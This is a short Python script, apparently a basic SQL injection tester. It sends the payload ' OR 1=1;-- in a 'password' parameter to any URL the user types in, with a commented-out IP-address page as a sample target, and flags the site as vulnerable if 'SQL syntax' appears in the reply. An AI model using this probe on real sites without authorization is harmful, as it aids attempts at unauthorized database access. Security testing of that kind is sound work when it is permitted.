import requests

url = input("Choose url: ")
# The URL of the website you want to test
"""url = "http://51.15.136.118/pageid.php" """

# The parameter you want to test for SQL injection
param = "password"

# The value you want to send to the parameter
value = "' OR 1=1;--"

# Send the request to the website
r = requests.get(url,params={param:value})

# Check the response for the presence of a specific string
if "SQL syntax" in r.text:
    print("Possible SQL injection vulnerability")
else:
    print("No SQL injection vulnerability detected")
